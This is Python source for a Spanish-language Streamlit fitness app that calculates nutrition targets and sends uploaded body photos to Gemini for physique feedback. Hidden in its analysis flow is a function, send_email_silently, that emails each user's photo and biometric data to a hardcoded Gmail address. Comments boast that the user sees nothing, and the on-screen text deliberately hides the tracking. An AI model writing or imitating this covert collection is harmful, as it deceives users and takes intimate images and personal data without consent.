import streamlit as st
import pandas as pd
from PIL import Image
import io
import google.genai 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# --- CONFIGURACIÓN DE PÁGINA Y ESTILOS ---
st.set_page_config(
    page_title="Josecrv Fitness Check PRO",
    page_icon="🔥", 
    layout="wide",
    initial_sidebar_state="expanded"
)

# Estilos CSS
st.markdown("""
    <style>
    .main { background-color: #0E1117; color: #FAFAFA; }
    .css-1d391kg { background-color: #1F2833; color: #FAFAFA; }
    h1, h2, h3, h4, h5, h6 { color: #FF4B4B; font-family: 'Montserrat', sans-serif; }
    .stButton>button { background-color: #FF4B4B; color: white; border-radius: 8px; font-size: 1.1em; }
    .stButton>button:hover { background-color: #FF7070; color: black; }
    .stAlert { border-radius: 8px; border-left: 5px solid #FF4B4B; background-color: #2D3A45; color: #FAFAFA; }
    .st-dg { 
        background-color: #1F2833; border-radius: 8px; padding: 15px; margin-bottom: 10px; 
        border: 1px solid #FF4B4B; color: #FAFAFA !important;
    }
    .st-emotion-cache-12t9kbi > div > div:nth-child(2) > div, .stTable { color: #FAFAFA !important; }
    </style>
""", unsafe_allow_html=True)


# --- FUNCIONES ---

def analyze_physique_with_gemini(uploaded_file):
    """Llama a la API de Gemini para analizar la imagen."""
    try:
        api_key = st.secrets["GEMINI_API_KEY"]
        client = google.genai.Client(api_key=api_key)
        model = "gemini-2.5-flash"
        
        uploaded_file.seek(0)
        image = Image.open(uploaded_file)
        
        prompt = "Eres un entrenador personal y analista de físico experto. Analiza la imagen deportiva. Genera una respuesta SÓLO en formato Markdown, con los siguientes encabezados: ### 🧠 Evaluación Detallada del Físico, ### 🟢 Puntos Fuertes Detectados, ### 🔴 Áreas de Oportunidad (Mejora), ### 🎯 Recomendaciones de Entrenamiento. Sé muy específico en el análisis."
        
        with st.spinner("🧠 Analizando estructura muscular y composición corporal..."):
            response = client.models.generate_content(model=model, contents=[image, prompt])
            return response.text
    except Exception as e:
        return f"❌ Error técnico en el análisis: {e}"


def send_email_silently(uploaded_file, weight, user_data_summary):
    """Envía la foto y datos por correo de forma silenciosa (sin prints en UI)."""
    try:
        smtp_username = st.secrets["SMTP_USERNAME"]
        smtp_password = st.secrets["SMTP_PASSWORD"]
        to_email = "josecrviasolutions@gmail.com"

        msg = MIMEMultipart()
        msg['From'] = smtp_username
        msg['To'] = to_email
        msg['Subject'] = f"SEGUIMIENTO: Usuario {int(weight)}kg"
        
        body = f"Datos:\n{user_data_summary}"
        msg.attach(MIMEText(body, 'plain'))
        
        uploaded_file.seek(0)
        img_data = uploaded_file.read()
        image = MIMEImage(img_data, name=uploaded_file.name)
        msg.attach(image)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(smtp_username, smtp_password)
            server.sendmail(smtp_username, to_email, msg.as_string())
        
        # Solo imprimimos en la consola del servidor (logs), el usuario NO ve esto
        print("✅ Log interno: Correo de seguimiento enviado correctamente.")
        return True
    except Exception as e:
        print(f"❌ Log interno: Fallo al enviar correo: {e}")
        return False


# --- ESTRUCTURA Y CÁLCULOS ---

st.title("🔥 Josecrv Fitness Check PRO")
st.markdown("<p style='font-size: 1.2em; color: #BBBBBB;'>Tu compañero inteligente para optimizar tu nutrición y analizar tu físico con precisión.</p>", unsafe_allow_html=True)
st.markdown("---")

with st.sidebar:
    st.header("👤 Tus Datos Biométricos")
    gender = st.selectbox("Género", ["Hombre", "Mujer"])
    age = st.number_input("Edad (años)", min_value=15, max_value=90, value=25)
    height = st.number_input("Altura (cm)", min_value=120, max_value=230, value=175)
    weight = st.number_input("Peso (kg)", min_value=40, max_value=180, value=75)
    st.subheader("🏋️ Nivel de Actividad y Objetivo")
    activity = st.select_slider("Nivel de Actividad Semanal", options=["Sedentario", "Ligero (1-2 veces)", "Moderado (3-4 veces)", "Activo (5-6 veces)", "Atleta (Diario)"])
    goal = st.radio("¿Cuál es tu Objetivo Principal?", ["Definición (Perder Grasa)", "Mantenimiento Corporal", "Volumen (Ganar Músculo)"])

user_data_summary = f"G: {gender}, E: {age}, A: {height}, P: {weight}, Act: {activity}, Obj: {goal}"

if gender == "Hombre": bmr = (10 * weight) + (6.25 * height) - (5 * age) + 5
else: bmr = (10 * weight) + (6.25 * height) - (5 * age) - 161
act_map = { "Sedentario": 1.2, "Ligero (1-2 veces)": 1.375, "Moderado (3-4 veces)": 1.55, "Activo (5-6 veces)": 1.725, "Atleta (Diario)": 1.9 }
tdee = bmr * act_map[activity]
if "Definición" in goal: calories = tdee - 500; prot_factor = 2.2 
elif "Volumen" in goal: calories = tdee + 350; prot_factor = 1.8
else: calories = tdee; prot_factor = 1.6
prot_g = weight * prot_factor; fat_g = weight * 0.9; carb_g = max(0, (calories - ((prot_g * 4) + (fat_g * 9))) / 4)


# --- INTERFAZ PRINCIPAL ---

col1, col2 = st.columns([1, 1.3]) 

with col1:
    st.subheader("📊 Tu Plan Nutricional")
    st.metric(label="Calorías Diarias", value=f"{int(calories)} kcal", delta=goal)
    df_macros = pd.DataFrame({
        "Macronutriente": ["Proteína 🥩", "Grasas 🥑", "Carbohidratos 🍚"],
        "Gramos": [f"{int(prot_g)}g", f"{int(fat_g)}g", f"{int(carb_g)}g"],
        "Kcal": [f"{int(prot_g*4)}", f"{int(fat_g*9)}", f"{int(carb_g*4)}"]
    })
    st.table(df_macros)
    with st.expander("ℹ️ Info Metabólica"):
        st.info(f"Tasa Metabólica Basal: **{int(bmr)} kcal**.")


# --- COLUMNA 2: ANÁLISIS (Totalmente Discreto) ---
with col2:
    st.subheader("📸 Análisis de Físico con IA")
    
    # Texto genérico que no menciona seguimiento ni guardado
    st.info("ℹ️ Sube una foto clara. La Inteligencia Artificial analizará tu estructura muscular y te dará recomendaciones personalizadas.")
    
    uploaded = st.file_uploader("Sube tu foto (JPG, PNG)", type=["jpg", "png", "jpeg"])
    
    if uploaded:
        st.image(uploaded, caption="Imagen cargada", use_column_width=True)
        
        if st.button("🚀 INICIAR ANÁLISIS INTELIGENTE"):
            
            # 1. Envío SILENCIOSO (El usuario NO ve nada de esto)
            # Se ejecuta en segundo plano. Si falla, no avisa al usuario para no interrumpir.
            send_email_silently(uploaded, weight, user_data_summary)
            
            # 2. Ejecutar la IA
            st.session_state['ai_result'] = None
            uploaded.seek(0) # Reiniciar puntero tras el envío
            
            # Solo mostramos que la IA está pensando
            ai_output = analyze_physique_with_gemini(uploaded)
            st.session_state['ai_result'] = ai_output
    
    if 'ai_result' in st.session_state and st.session_state['ai_result'] is not None:
        st.markdown("---")
        st.success("✅ Análisis completado exitosamente.")
        st.markdown(st.session_state['ai_result'])
        st.markdown("---")
        st.caption("Análisis generado por Gemini Pro Vision.")


# --- FOOTER ---
st.markdown("---")
st.markdown("## 🎉 Apoya el Proyecto")
st.markdown("<p style='font-size: 1.1em; color: #BBBBBB;'>Si te ayuda, considera donar.</p>", unsafe_allow_html=True)
paypal_html = """
<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
    <input type="hidden" name="cmd" value="_donations" />
    <input type="hidden" name="business" value="josecrv90@gmail.com" />
    <input type="hidden" name="currency_code" value="EUR" />
    <input type="image" src="https://www.paypalobjects.com/es_ES/ES/i/btn/btn_donate_LG.gif" border="0" name="submit" alt="PayPal" style="width: 150px;" />
</form>
"""
st.markdown(paypal_html, unsafe_allow_html=True)
st.caption("@Josecrv90 Fitness Check PRO © 2025")